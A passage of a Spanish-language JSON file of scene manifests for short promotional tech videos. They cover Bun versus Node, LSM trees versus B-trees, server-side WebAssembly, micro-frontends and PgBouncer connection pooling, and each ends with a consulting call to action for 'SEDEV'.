          "voiceover": "Audito el rendimiento y la configuración de pipelines TypeScript para reducir tiempos de build y despliegue. Link en mi perfil.",
          "visual_cue": "Cierre con auditoría de performance en TypeScript",
          "props": {
            "header": "AUDITORÍA DE TOOLING & PERFORMANCE",
            "title": "OPTIMIZA TU ENTORNO TYPESCRIPT",
            "cta": {
              "badge": "AUDITORÍA DE TOOLING // SEDEV",
              "text": "¿Tus builds de TypeScript tardan demasiado? Link en mi perfil para optimizar tu stack."
            }
          }
        }
      ]
    }
  },
  {
    "key": "13_B",
    "topicNum": "13",
    "group": "13. BUN VS NODE22",
    "label": "Var B (Polémico): ¿Vale la pena migrar a Bun en producción o Node.js ya cerró la brecha?",
    "variation": "B (Polémico)",
    "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
    "manifest": {
      "title": "[13] ¿Vale la pena migrar a Bun en producción o Node.js ya cerró la brecha? (Var B)",
      "category": "JAVASCRIPT RUNTIMES & HERRAMIENTAS",
      "slug": "13_bun_vs_node22",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_runtime_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Bun es increíblemente rápido en tu máquina de desarrollo, pero ¿es seguro migrar toda tu infraestructura de producción hoy mismo?",
          "visual_cue": "Gancho cinético sobre estabilidad de producción",
          "props": {
            "badge": "DECISIÓN DE PRODUCCIÓN",
            "lines": [
              {
                "text": "¿MIGRAR A BUN O",
                "color": "#ffffff"
              },
              {
                "text": "SEGUIR EN NODE 22?",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "VELOCIDAD VS ESTABILIDAD DE PAQUETES NATIVOS",
            "icon": "scale_balance"
          }
        },
        {
          "id": "tradeoff_bun_node",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Usa Bun como gestor de paquetes y ejecutor de tests para ganar diez veces más velocidad en CI/CD; evalúa con cuidado las librerías C++ nativas en el servidor.",
          "visual_cue": "Matriz de compatibilidad y recomendación de adopción gradual",
          "props": {
            "header": "ESTRATEGIA DE ADOPCIÓN",
            "title": "DÓNDE USAR CADA RUNTIME",
            "colA": "BUN (DESARROLLO & CI)",
            "colB": "NODE 22 (PRODUCCIÓN CORE)",
            "rows": [
              {
                "dim": "Instalación de paquetes (CI/CD)",
                "a": "✔ 30x más rápido",
                "b": "✖ Lento en pipelines",
                "aGood": true
              },
              {
                "dim": "Ejecución de tests locales",
                "a": "✔ Resultados instantáneos",
                "b": "✖ Mayor consumo CPU",
                "aGood": true
              },
              {
                "dim": "Librerías legacy en C++ (Addons)",
                "a": "✖ Casos límite",
                "b": "✔ 100% compatible N-API",
                "aGood": false
              }
            ]
          }
        },
        {
          "id": "cta_runtime_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Ayudo a equipos de ingeniería a modernizar sus proyectos TypeScript sin romper producción. Contáctame en el enlace de mi perfil.",
          "visual_cue": "Cierre con consultoría de modernización",
          "props": {
            "header": "MODERNIZACIÓN DE ARQUITECTURA JS/TS",
            "title": "TRANSICIÓN SEGURA Y DE ALTO RENDIMIENTO",
            "cta": {
              "badge": "CONSULTORÍA SENIOR // SEDEV",
              "text": "Moderniza tu stack de JavaScript sin sorpresas. Agenda una sesión técnica en mi biografía."
            }
          }
        }
      ]
    }
  },
  {
    "key": "14_A",
    "topicNum": "14",
    "group": "14. LSM TREES VS BTREES",
    "label": "Var A (Técnico): LSM Trees vs B-Trees: MemTable, SSTables y páginas en disco",
    "variation": "A (Técnico)",
    "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
    "manifest": {
      "title": "[14] LSM Trees vs B-Trees: MemTable, SSTables y páginas en disco (Var A)",
      "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
      "slug": "14_lsm_trees_vs_btrees",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_lsm",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Por qué bases de datos como Cassandra y RocksDB escriben a velocidades inhumanas mientras Postgres prefiere B-Trees? La clave está en los LSM Trees.",
          "visual_cue": "Gancho cinético sobre almacenamiento interno",
          "props": {
            "badge": "INTERNAL STORAGE ENGINES",
            "lines": [
              {
                "text": "LSM TREES VS B-TREES",
                "color": "#ffffff"
              },
              {
                "text": "CÓMO ESCRIBEN EN DISCO",
                "color": "#10b981"
              }
            ],
            "subtitle": "MEMTABLE // SSTABLES // BÚSQUEDA BINARIA",
            "icon": "tree"
          }
        },
        {
          "id": "lsm_flow",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "Un LSM Tree escribe primero en una MemTable en memoria RAM y luego vuelca bloques secuenciales inmutables en disco, logrando escrituras casi a velocidad de cable.",
          "visual_cue": "Diagrama de flujo: MemTable en RAM -> Append-Only WAL -> Flush a SSTables en NVMe",
          "props": {
            "header": "FLUJO DE ESCRITURA EN LSM",
            "title": "ESCRITURAS SECUENCIALES INMUTABLES",
            "nodes": [
              {
                "id": "ram",
                "label": "MEMTABLE (SKIPLIST EN RAM)",
                "sublabel": "Escrituras directas O(1) en memoria DDR5",
                "color": "#10b981",
                "y": 160
              },
              {
                "id": "wal",
                "label": "APPEND-ONLY LOG EN NVMe",
                "sublabel": "Cero escrituras aleatorias // Máximo throughput",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "sst",
                "label": "SSTABLES INMUTABLES EN DISCO",
                "sublabel": "Compactación en segundo plano por niveles",
                "color": "#38bdf8",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "btree_diff",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "En cambio, un B-Tree sobrescribe páginas en ubicaciones aleatorias. Es más lento para escribir, pero sus lecturas son instantáneas con un solo salto.",
          "visual_cue": "Matriz técnica de compensaciones entre motores",
          "props": {
            "header": "COMPENSACIONES DE HARDWARE",
            "title": "LSM-TREE VS B-TREE",
            "colA": "LSM-TREE (ROCKSDB)",
            "colB": "B-TREE (POSTGRESQL)",
            "rows": [
              {
                "dim": "Velocidad de Escritura",
                "a": "✔ Ultra rápida (Append-only)",
                "b": "✖ Lenta (Random page writes)",
                "aGood": true
              },
              {
                "dim": "Velocidad de Lectura puntual",
                "a": "✖ Requiere mirar Bloom Filters",
                "b": "✔ 1 solo seek O(log N)",
                "aGood": false
              },
              {
                "dim": "Amplificación de Escritura",
                "a": "Alta (Por compactación)",
                "b": "Baja (Páginas directas)",
                "aGood": false
              }
            ]
          }
        },
        {
          "id": "cta_lsm",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito motores de persistencia y diagnostico cuellos de botella de disco en sistemas con cargas masivas. Link en mi perfil.",
          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
          "props": {
            "header": "AUDITORÍA DE BASES DE DATOS & I/O",
            "title": "RESOLUCIÓN DE CUELLOS DE BOTELLA",
            "cta": {
              "badge": "AUDITORÍA DE DATOS // SEDEV",
              "text": "¿Tu base de datos sufre por escrituras masivas? Link en mi perfil para agendar tu auditoría."
            }
          }
        }
      ]
    }
  },
  {
    "key": "14_B",
    "topicNum": "14",
    "group": "14. LSM TREES VS BTREES",
    "label": "Var B (Polémico): ¿Por qué tu base colapsa en escrituras masivas? Postgres vs RocksDB",
    "variation": "B (Polémico)",
    "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
    "manifest": {
      "title": "[14] ¿Por qué tu base colapsa en escrituras masivas? Postgres vs RocksDB (Var B)",
      "category": "SISTEMAS DE ALMACENAMIENTO & BASES DE DATOS",
      "slug": "14_lsm_trees_vs_btrees",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_lsm_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Estás bombardeando PostgreSQL con cien mil eventos de analítica por segundo y tu disco entró en saturación total por culpa de los B-Trees.",
          "visual_cue": "Gancho cinético sobre colapso en disco",
          "props": {
            "badge": "INCIDENTES DE PRODUCCIÓN",
            "lines": [
              {
                "text": "¿TU BASE COLAPSA CON",
                "color": "#ffffff"
              },
              {
                "text": "ESCRITURAS MASIVAS?",
                "color": "#ef4444"
              }
            ],
            "subtitle": "CUANDO EL MOTOR DE PERSISTENCIA ES EL EQUIVOCADO",
            "icon": "database"
          }
        },
        {
          "id": "iops_split",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "No intentes usar una base de datos optimizada para lecturas para ingerir telemetría masiva. Seleccionar el motor de almacenamiento correcto salva tu infraestructura.",
          "visual_cue": "Doble terminal: IOPS saturados en Postgres vs Ingesta fluida en RocksDB/ClickHouse",
          "props": {
            "header": "TELEMETRÍA DE DISCO",
            "title": "SATURACIÓN DE IOPS EN NVME",
            "termA": {
              "title": "POSTGRESQL INSERT MASIVO",
              "color": "#ef4444",
              "cmd": "iostat -xz 1",
              "status": "Disco al 99.8% de utilización // I/O Wait",
              "time": "Saturado",
              "lines": [
                "B-Tree lock contention en páginas de índices",
                "WAL flush bottleneck bloqueando hilos de workers",
                "Peticiones HTTP cayendo con error 504 Gateway Timeout"
              ]
            },
            "termB": {
              "title": "LSM / COLUMNAR ENGINE",
              "color": "#10b981",
              "cmd": "ingest_worker --batch=10000",
              "status": "Escrituras secuenciales sin bloqueos de lectura",
              "time": "Fluido",
              "lines": [
                "MemTable absorbe ráfagas de 150,000 req/s",
                "Utilización de disco por debajo del 25%",
                "Latencia de inserción estable en sub-milisegundos"
              ]
            }
          }
        },
        {
          "id": "cta_lsm_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura de datos de tu producto para seleccionar el motor adecuado y evitar caídas en picos de tráfico. Enlace en mi bio.",
          "visual_cue": "Cierre con auditoría de datos",
          "props": {
            "header": "AUDITORÍA DE PERSISTENCIA & LATENCIA",
            "title": "DISEÑO DE CAPA DE DATOS PARA ALTA CARGA",
            "cta": {
              "badge": "AUDITORÍA DE DATOS // SEDEV",
              "text": "Evita caídas por saturación de base de datos. Agenda tu auditoría técnica en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "15_A",
    "topicNum": "15",
    "group": "15. WEBASSEMBLY SERVIDOR",
    "label": "Var A (Técnico): Sandboxing matemático: Wasmtime y aislamiento de código",
    "variation": "A (Técnico)",
    "category": "RUNTIMES DE SERVIDOR & WASM",
    "manifest": {
      "title": "[15] Sandboxing matemático: Wasmtime y aislamiento de código (Var A)",
      "category": "RUNTIMES DE SERVIDOR & WASM",
      "slug": "15_webassembly_servidor",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_wasm",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo ejecutar código no confiable escrito por usuarios a velocidad nativa sin el peligro de comprometer tu servidor? Con WebAssembly en el backend.",
          "visual_cue": "Gancho cinético sobre WebAssembly en el servidor",
          "props": {
            "badge": "WASM SERVERLESS 2026",
            "lines": [
              {
                "text": "WEBASSEMBLY EN EL",
                "color": "#ffffff"
              },
              {
                "text": "SERVIDOR (WASMTIME)",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "SANDBOXING MATEMÁTICO // ARRANQUE EN 1MS",
            "icon": "cpu"
          }
        },
        {
          "id": "wasm_memory",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "Un módulo WASI tiene una memoria lineal estrictamente delimitada. El programa no puede leer ni escribir ni un solo byte fuera de su espacio asignado.",
          "visual_cue": "Memoria lineal delimitada de WebAssembly",
          "props": {
            "header": "AISLAMIENTO MATEMÁTICO",
            "title": "MEMORIA LINEAL ENCAPSULADA",
            "items": [
              {
                "name": "ESPACIO DEL MÓDULO WASM",
                "addr": "0x0000 -> 0xFFFF",
                "value": "Memoria lineal aislada // Cero acceso a syscalls",
                "color": "#10b981"
              },
              {
                "name": "MEMORIA DEL KERNEL HOST",
                "addr": "BLOQUEADA",
                "value": "Protegida con guard pages por hardware",
                "color": "#ef4444"
              }
            ]
          }
        },
        {
          "id": "wasm_speed",
          "type": "metrics_comparison",
          "duration": 6,
          "voiceover": "Mientras un contenedor Docker tarda cientos de milisegundos en arrancar, una función WASM se inicializa en menos de un milisegundo consumiendo kilobytes.",
          "visual_cue": "Comparación de cold start: Docker vs WebAssembly",
          "props": {
            "header": "COLD START EN EDGE COMPUTING",
            "metricA": {
              "label": "CONTENEDOR DOCKER LIGHT",
              "value": "450ms",
              "sub": "Namespace init + OverlayFS mount",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "WASM MICRO-RUNTIME",
              "value": "0.8ms",
              "sub": "Instanciación de memoria directa",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta_wasm",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Diseño arquitecturas seguras de ejecución de código y micro-runtimes aislados. Si necesitas un ingeniero especializado para tu sistema, link en mi bio.",
          "visual_cue": "Cierre con contratación senior",
          "props": {
            "header": "CONTRATACIÓN SENIOR / SISTEMAS",
            "title": "ARQUITECTURA DE RUNTIMES & EDGE COMPUTING",
            "cta": {
              "badge": "STAFF ENGINEER // SEDEV",
              "text": "¿Necesitas ejecutar plugins o código aislado de forma segura? Hablemos en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "15_B",
    "topicNum": "15",
    "group": "15. WEBASSEMBLY SERVIDOR",
    "label": "Var B (Polémico): ¿Morirá Docker en el Edge? Arranques en 1 milisegundo con WASM",
    "variation": "B (Polémico)",
    "category": "RUNTIMES DE SERVIDOR & WASM",
    "manifest": {
      "title": "[15] ¿Morirá Docker en el Edge? Arranques en 1 milisegundo con WASM (Var B)",
      "category": "RUNTIMES DE SERVIDOR & WASM",
      "slug": "15_webassembly_servidor",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_wasm_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "El creador de Docker dijo que si WASM hubiera existido en 2008, no habrían tenido que crear Docker. En 2026 estamos viendo esa profecía cumplirse.",
          "visual_cue": "Gancho cinético sobre el futuro post-Docker",
          "props": {
            "badge": "EL FUTURO DE LA NUBE",
            "lines": [
              {
                "text": "¿MORIRÁ DOCKER",
                "color": "#ffffff"
              },
              {
                "text": "EN EL EDGE?",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "EL ASCENSO DEL COMPONENT MODEL DE WASM",
            "icon": "server_rack"
          }
        },
        {
          "id": "tradeoff_docker_wasm",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "WebAssembly no reemplaza a Docker para sistemas legacy completos, pero para funciones serverless y plugins de alta densidad es infinitamente superior.",
          "visual_cue": "Matriz comparativa Docker vs WebAssembly",
          "props": {
            "header": "COMPARATIVA DE CONTENCIÓN",
            "title": "DOCKER CONTAINERS VS WEBASSEMBLY",
            "colA": "WEBASSEMBLY (WASI)",
            "colB": "DOCKER (OCI)",
            "rows": [
              {
                "dim": "Tiempo de arranque en frío",
                "a": "✔ < 1 milisegundo",
                "b": "✖ 300-800 milisegundos",
                "aGood": true
              },
              {
                "dim": "Tamaño del binario",
                "a": "✔ 2 a 10 Megabytes",
                "b": "✖ 150 a 500 Megabytes",
                "aGood": true
              },
              {
                "dim": "Soporte de apps monolíticas",
                "a": "✖ Requiere compilar a WASI",
                "b": "✔ Cualquier Linux binario",
                "aGood": false
              }
            ]
          }
        },
        {
          "id": "cta_wasm_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Asesoro a empresas en modernización de infraestructura serverless y diseño de sandboxes seguros. Contacto en mi biografía.",
          "visual_cue": "Cierre con consultoría de infraestructura",
          "props": {
            "header": "CONSULTORÍA DE INFRAESTRUCTURA",
            "title": "ARQUITECTURA DE SERVERLESS DE PRÓXIMA GENERACIÓN",
            "cta": {
              "badge": "CONSULTORÍA TÉCNICA // SEDEV",
              "text": "¿Interesado en WASM o arquitecturas Edge? Link en mi perfil para agendar tu sesión."
            }
          }
        }
      ]
    }
  },
  {
    "key": "16_A",
    "topicNum": "16",
    "group": "16. FRACASO MICROFRONTENDS",
    "label": "Var A (Técnico): La sobrecarga del bundle: Por qué Module Federation degradó la web",
    "variation": "A (Técnico)",
    "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
    "manifest": {
      "title": "[16] La sobrecarga del bundle: Por qué Module Federation degradó la web (Var A)",
      "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
      "slug": "16_fracaso_microfrontends",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_mf",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Por qué tantas empresas están desmantelando sus micro-frontends para volver a un monorepo unificado? Por el brutal impacto en el rendimiento.",
          "visual_cue": "Gancho cinético sobre el colapso del rendimiento por micro-frontends",
          "props": {
            "badge": "ARQUITECTURA WEB 2026",
            "lines": [
              {
                "text": "EL FRACASO DE LOS",
                "color": "#ffffff"
              },
              {
                "text": "MICRO-FRONTENDS",
                "color": "#ef4444"
              }
            ],
            "subtitle": "SOBRECARGA DE BUNDLE // WATERFALLS DE RED",
            "icon": "terminal"
          }
        },
        {
          "id": "bundle_waterfall",
          "type": "network_pipeline",
          "duration": 6.5,
          "voiceover": "Cada micro-frontend descarga su propia copia de librerías, provocando descargas de múltiples versiones de React y waterfalls de red inmanejables.",
          "visual_cue": "Pipeline visual mostrando la cascada de scripts y dependencias duplicadas",
          "props": {
            "header": "WATERFALL DE DESCARGA",
            "title": "FRAGMENTACIÓN DE DEPENDENCIAS",
            "subtitle": "TRIPLE CARGA DE FRAMEWORKS EN EL NAVEGADOR",
            "stages": [
              {
                "id": "app1",
                "label": "HEADER MFE (REACT 18.2)",
                "sub": "Descarga 140KB de runtime inicial",
                "y": 220,
                "color": "#ef4444",
                "metric": "180ms"
              },
              {
                "id": "app2",
                "label": "CHECKOUT MFE (REACT 19.0)",
                "sub": "Descarga 160KB duplicados por conflicto",
                "y": 520,
                "color": "#fbbf24",
                "metric": "290ms"
              },
              {
                "id": "app3",
                "label": "FOOTER MFE (VUE 3)",
                "sub": "Tercer framework compitiendo por hilo principal",
                "y": 820,
                "color": "#38bdf8",
                "metric": "420ms"
              }
            ]
          }
        },
        {
          "id": "metrics_perf",
          "type": "metrics_comparison",
          "duration": 6,
          "voiceover": "El navegador pasa más tiempo parseando JavaScript redundante que renderizando contenido, destruyendo las métricas de Core Web Vitals.",
          "visual_cue": "Comparativa de Core Web Vitals: Micro-frontends vs Monorepo limpio",
          "props": {
            "header": "IMPACTO EN CORE WEB VITALS",
            "metricA": {
              "label": "MICRO-FRONTENDS FEDERATION",
              "value": "3.4s LCP",
              "sub": "Puntaje de Performance: 42/100",
              "color": "#ef4444"
            },
            "metricB": {
              "label": "MONOREPO UNIFICADO",
              "value": "0.6s LCP",
              "sub": "Puntaje de Performance: 98/100",
              "color": "#10b981"
            }
          }
        },
        {
          "id": "cta_mf",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la arquitectura frontend y optimizo Core Web Vitals para aplicaciones complejas. Link en mi perfil para agendar una sesión técnica.",
          "visual_cue": "Cierre con llamado a auditoría de arquitectura frontend",
          "props": {
            "header": "AUDITORÍA DE ARQUITECTURA FRONTEND",
            "title": "RECUPERA LA VELOCIDAD DE TU APLICACIÓN",
            "cta": {
              "badge": "AUDITORÍA DE RENDIMIENTO WEB // SEDEV",
              "text": "¿Tu aplicación web está pesada y fragmentada? Link en mi perfil para auditarla."
            }
          }
        }
      ]
    }
  },
  {
    "key": "16_B",
    "topicNum": "16",
    "group": "16. FRACASO MICROFRONTENDS",
    "label": "Var B (Polémico): El desastre de los Micro-frontends: La vuelta al monorepo unificado",
    "variation": "B (Polémico)",
    "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
    "manifest": {
      "title": "[16] El desastre de los Micro-frontends: La vuelta al monorepo unificado (Var B)",
      "category": "FRONTEND ARCHITECTURE & WEB PERFORMANCE",
      "slug": "16_fracaso_microfrontends",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_mf_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Adoptaste micro-frontends porque un artículo de Medium dijo que era lo moderno y ahora tienes un infierno de estilos rotos y dependencias cruzadas.",
          "visual_cue": "Gancho cinético sobre el arrepentimiento de micro-frontends",
          "props": {
            "badge": "LECCIONES DE INDUSTRIA",
            "lines": [
              {
                "text": "DESMANTELANDO LOS",
                "color": "#ef4444"
              },
              {
                "text": "MICRO-FRONTENDS",
                "color": "#ffffff"
              }
            ],
            "subtitle": "EL REGRESO AL MONOREPO LIMPIO CON ISLANDS",
            "icon": "terminal"
          }
        },
        {
          "id": "tradeoff_mfe",
          "type": "tradeoff_matrix",
          "duration": 6,
          "voiceover": "Los monorepos modernos con herramientas como Turborepo o Nx permiten que múltiples equipos trabajen sin destruir la experiencia del usuario final.",
          "visual_cue": "Matriz comparativa Micro-frontends vs Monorepo moderno",
          "props": {
            "header": "ORGANIZACIÓN VS EXPERIENCIA DE USUARIO",
            "title": "MICRO-FRONTENDS VS MONOREPO MODERNO",
            "colA": "MONOREPO CON TURBOREPO",
            "colB": "MICRO-FRONTENDS (IFRAMES/MFE)",
            "rows": [
              {
                "dim": "Experiencia de Usuario (LCP)",
                "a": "✔ Rápida y unificada",
                "b": "✖ Lenta y fragmentada",
                "aGood": true
              },
              {
                "dim": "Consistencia de Diseño (CSS)",
                "a": "✔ Sistema de diseño único",
                "b": "✖ Conflictos de estilos globales",
                "aGood": true
              },
              {
                "dim": "Mantenimiento de Dependencias",
                "a": "✔ 1 solo lockfile auditado",
                "b": "✖ 8 package.json desfasados",
                "aGood": true
              }
            ]
          }
        },
        {
          "id": "cta_mf_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Ayudo a empresas a consolidar arquitecturas frontend fragmentadas en monorepos de alto rendimiento. Escríbeme o agenda en mi perfil.",
          "visual_cue": "Cierre con auditoría de arquitectura frontend",
          "props": {
            "header": "CONSOLIDACIÓN DE CODEBASE FRONTEND",
            "title": "SIMPLIFICA TUS PROCESOS DE ENTREGA",
            "cta": {
              "badge": "CONSULTORÍA FRONTEND // SEDEV",
              "text": "Consolida tus micro-frontends en un monorepo limpio. Link en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "17_A",
    "topicNum": "17",
    "group": "17. CONNECTION POOLING PGBOUNCER",
    "label": "Var A (Técnico): El costo de un fork() en Linux: Cómo 1000 conexiones matan a Postgres",
    "variation": "A (Técnico)",
    "category": "BASES DE DATOS & ESCALABILIDAD",
    "manifest": {
      "title": "[17] El costo de un fork() en Linux: Cómo 1000 conexiones matan a Postgres (Var A)",
      "category": "BASES DE DATOS & ESCALABILIDAD",
      "slug": "17_connection_pooling_pgbouncer",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_pgb",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Por qué conectar mil usuarios directos a PostgreSQL satura tu servidor aunque no estén haciendo ninguna consulta? Por el costo de los procesos de Linux.",
          "visual_cue": "Gancho cinético sobre saturación de procesos en Postgres",
          "props": {
            "badge": "POSTGRESQL INTERNALS",
            "lines": [
              {
                "text": "EL COSTE DE UN FORK()",
                "color": "#ffffff"
              },
              {
                "text": "EN POSTGRESQL",
                "color": "#38bdf8"
              }
            ],
            "subtitle": "PROCESO POR CONEXIÓN // CONSUMO DE MEMORIA",
            "icon": "database"
          }
        },
        {
          "id": "fork_arch",
          "type": "memory_layout",
          "duration": 6,
          "voiceover": "Postgres es multi-proceso, no multi-hilo. Cada conexión crea un proceso independiente en Linux que consume hasta diez megabytes de RAM sin hacer nada.",
          "visual_cue": "Layout de memoria mostrando backend processes compitiendo por CPU y RAM",
          "props": {
            "header": "ARQUITECTURA DE PROCESOS",
            "title": "POSTMASTER Y BACKEND WORKERS",
            "items": [
              {
                "name": "1000 CONEXIONES DIRECTAS",
                "addr": "1000 PROCESOS FORK()",
                "value": "10GB RAM solo en estructuras de conexión",
                "color": "#ef4444"
              },
              {
                "name": "CAMBIO DE CONTEXTO EN KERNEL",
                "addr": "CONTEXT SWITCH OVERHEAD",
                "value": "La CPU gasta 60% solo cambiando de tarea",
                "color": "#f59e0b"
              }
            ]
          }
        },
        {
          "id": "pgbouncer_pool",
          "type": "architecture_flow",
          "duration": 6.5,
          "voiceover": "PgBouncer actúa como un embudo inteligente. Mantiene solo veinte conexiones reales con la base y atiende a miles de clientes en modo transaccional.",
          "visual_cue": "Diagrama de flujo: 10,000 conexiones de clientes pasando por PgBouncer a 20 conexiones reales de Postgres",
          "props": {
            "header": "CONNECTION POOLING EFICIENTE",
            "title": "EMBUDO TRANSACCIONAL CON PGBOUNCER",
            "nodes": [
              {
                "id": "clients",
                "label": "10,000 CONEXIONES ACTIVAS",
                "sublabel": "Servidores web / Workers concurrentes",
                "color": "#38bdf8",
                "y": 160
              },
              {
                "id": "pooler",
                "label": "PGBOUNCER (TRANSACTION MODE)",
                "sublabel": "Multiplexa peticiones en un micro-proceso en C",
                "color": "#fbbf24",
                "y": 520
              },
              {
                "id": "db",
                "label": "POSTGRES (20 POOL WORKERS)",
                "sublabel": "100% de la CPU dedicada a ejecutar queries reales",
                "color": "#10b981",
                "y": 880
              }
            ]
          }
        },
        {
          "id": "cta_pgb",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Si tu base de datos sufre picos de latencia o agota su pool de conexiones en momentos críticos, audito tu infraestructura de datos. Link en mi perfil.",
          "visual_cue": "Cierre con llamado a auditoría de bases de datos",
          "props": {
            "header": "AUDITORÍA DE RENDIMIENTO DE BASES DE DATOS",
            "title": "OPTIMIZA TUS POOLS DE CONEXIÓN",
            "cta": {
              "badge": "AUDITORÍA DE DATOS // SEDEV",
              "text": "¿Problemas con max_connections en Postgres? Link en mi bio para agendar una auditoría técnica."
            }
          }
        }
      ]
    }
  },
  {
    "key": "17_B",
    "topicNum": "17",
    "group": "17. CONNECTION POOLING PGBOUNCER",
    "label": "Var B (Polémico): Tu base de datos no está lenta, estás saturando el pool de conexiones",
    "variation": "B (Polémico)",
    "category": "BASES DE DATOS & ESCALABILIDAD",
    "manifest": {
      "title": "[17] Tu base de datos no está lenta, estás saturando el pool de conexiones (Var B)",
      "category": "BASES DE DATOS & ESCALABILIDAD",
      "slug": "17_connection_pooling_pgbouncer",
      "variation": "B",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_pgb_b",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "Subiste el tamaño del servidor de base de datos a una máquina de mil dólares y sigue lenta. El problema no es el hardware: es que no tienes un pooler.",
          "visual_cue": "Gancho cinético sobre diagnósticos erróneos de infraestructura",
          "props": {
            "badge": "DIAGNÓSTICO TÉCNICO",
            "lines": [
              {
                "text": "TU BASE DE DATOS",
                "color": "#ffffff"
              },
              {
                "text": "NO ESTÁ LENTA",
                "color": "#ef4444"
              }
            ],
            "subtitle": "ESTÁS SATURANDO EL POOL DE CONEXIONES",
            "icon": "database"
          }
        },
        {
          "id": "split_unpooled_pooled",
          "type": "terminal_split",
          "duration": 6,
          "voiceover": "Limitar las conexiones de la base de datos a dos veces el número de núcleos de CPU multiplica el throughput por cinco al eliminar la contención de cerraduras.",
          "visual_cue": "Doble terminal: Error fatal de max_connections vs PgBouncer fluido",
          "props": {
            "header": "BENCHMARK DE CONEXIONES",
            "title": "CONEXIÓN DIRECTA VS POOLING TRANSACCIONAL",
            "termA": {
              "title": "SIN POOLER (MAX_CONNECTIONS = 1000)",
              "color": "#ef4444",
              "cmd": "psql -c \"SELECT count(*) FROM pg_stat_activity;\"",
              "status": "FATAL: remaining connection slots are reserved",
              "time": "Caída de servicio",
              "lines": [
                "Memoria swap activada en servidor de Postgres",
                "Pérdida de paquetes en cola de sockets",
                "Latencia p99 disparada a 8.2 segundos"
              ]
            },
            "termB": {
              "title": "CON PGBOUNCER (POOL_SIZE = 25)",
              "color": "#10b981",
              "cmd": "pgbouncer -d /etc/pgbouncer.ini",
              "status": "10,000 clientes atendidos sin error",
              "time": "Estable 24/7",
              "lines": [
                "Uso de memoria constante y bajo",
                "CPU al 40% ejecutando queries reales",
                "Latencia p99 estable en 4 milisegundos"
              ]
            }
          }
        },
        {
          "id": "cta_pgb_b",
          "type": "tradeoff_matrix",
          "duration": 5,
          "voiceover": "Audito la configuración de PostgreSQL y resuelvo cuellos de botella de concurrencia y latencia p99. Agenda tu revisión en mi bio.",
          "visual_cue": "Cierre con auditoría técnica de Postgres",
          "props": {
            "header": "AUDITORÍA DE POSTGRESQL & ESCALABILIDAD",
            "title": "RESOLUCIÓN DE CONGESTIÓN DE CONEXIONES",
            "cta": {
              "badge": "AUDITORÍA TÉCNICA // SEDEV",
              "text": "Elimina cuellos de botella en tu base de datos. Enlace directo en mi perfil."
            }
          }
        }
      ]
    }
  },
  {
    "key": "18_A",
    "topicNum": "18",
    "group": "18. BLOOM FILTERS PROBABILISTIC",
    "label": "Var A (Técnico): Bloom Filters: Cómo saber si un registro existe con 99% de certeza",
    "variation": "A (Técnico)",
    "category": "ESTRUCTURAS DE DATOS & CACHÉ",
    "manifest": {
      "title": "[18] Bloom Filters: Cómo saber si un registro existe con 99% de certeza (Var A)",
      "category": "ESTRUCTURAS DE DATOS & CACHÉ",
      "slug": "18_bloom_filters_probabilistic",
      "variation": "A",
      "fps": 30,
      "scenes": [
        {
          "id": "hook_bloom",
          "type": "kinetic_hook",
          "duration": 4.5,
          "voiceover": "¿Cómo saber si un usuario ya leyó un artículo entre quinientos millones de registros usando solo un par de bits de memoria? Con Bloom Filters.",
          "visual_cue": "Gancho cinético sobre estructuras probabilísticas",
          "props": {
            "badge": "ESTRUCTURAS DE DATOS 2026",
            "lines": [
              {
